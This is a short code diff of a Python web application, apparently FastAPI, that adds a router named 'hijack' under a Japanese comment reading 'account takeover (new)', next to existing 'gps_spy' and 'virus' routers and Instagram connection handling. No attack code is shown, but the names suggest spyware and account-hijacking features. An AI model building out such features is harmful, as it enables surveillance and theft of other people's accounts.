@@ -53,6 +53,9 @@ from . import gps_spy
 app.include_router(gps_spy.router)
 from . import virus
 app.include_router(virus.router)
+# --- アカウント乗っ取り（新規） ---
+from . import hijack
+app.include_router(hijack.router)
 # ---------- Instagram 接続の状態管理 ----------
 
 _IG_LOCK = threading.RLock()
